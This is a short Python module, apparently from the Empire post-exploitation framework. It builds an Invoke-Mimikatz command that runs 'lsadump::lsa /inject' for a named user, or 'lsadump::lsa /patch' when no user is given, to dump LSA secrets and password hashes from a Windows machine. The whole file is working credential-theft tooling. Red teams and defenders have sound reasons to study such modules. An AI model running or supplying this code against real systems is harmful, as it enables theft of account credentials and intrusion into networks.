from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source

class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):

        script_end = "Invoke-Mimikatz -Command "

        if params["Username"] != "":
            script_end += "'\"lsadump::lsa /inject /name:" + params["Username"]
        else:
            script_end += "'\"lsadump::lsa /patch"

        script_end += "\"';"

        return script, script_end
